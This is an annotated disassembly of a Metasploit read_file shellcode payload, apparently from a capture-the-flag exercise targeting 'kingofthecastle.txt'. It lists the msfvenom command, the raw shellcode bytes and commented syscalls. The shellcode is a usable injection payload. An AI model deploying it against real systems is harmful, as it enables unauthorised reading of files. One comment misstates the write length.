; msfvenom ndisasm dump
; command: `msfvenom -p linux/x86/read_file PATH=kingofthecastle.txt R | ndisasm -u -`

; shellcode: "\xeb\x36\xb8\x05\x00\x00\x00\x5b\x31\xc9\xcd\x80\x89\xc3\xb8"
; "\x03\x00\x00\x00\x89\xe7\x89\xf9\xba\x00\x10\x00\x00\xcd\x80"
; "\x89\xc2\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xcd\x80\xb8"
; "\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xc5\xff\xff"
; "\xff\x6b\x69\x6e\x67\x6f\x66\x74\x68\x65\x63\x61\x73\x74\x6c"
; "\x65\x2e\x74\x78\x74\x00";

; jump to instruction `call 0x2`
jmp short 0x38

; open(*pathname, flags) syscall
mov eax,0x5
pop ebx
xor ecx,ecx
int 0x80

; read(fd, *buf, 4096) syscall
mov ebx,eax
mov eax,0x3
mov edi,esp
mov ecx,edi
mov edx,0x1000
int 0x80

; write(1, *buf, 10) syscall
mov edx,eax
mov eax,0x4
mov ebx,0x1
int 0x80

; exit(0) syscall
mov eax,0x1
mov ebx,0x0
int 0x80

; call to instruction `mov eax, 0x5` above
call 0x2

; payload "kingofthecastle.txt" encoded as x86 instructions
imul ebp,[ecx+0x6e],byte +0x67   ; 0000003D  6B 69 6E 67 (k i n g)
outsd                            ; 00000041  6F          (o)
o16 jz 0xad                      ; 00000042  66 74 68    (f t h)
arpl [gs:ecx+0x73],sp            ; 00000045  65 63 61 73 (e c a s)
jz 0xb7                          ; 00000049  74 6C       (t l)
cs jz 0xc7                       ; 0000004B  65 2E 74 78 (e . t x)
jz 0x51                          ; 0000004F  74 00       (t \0)
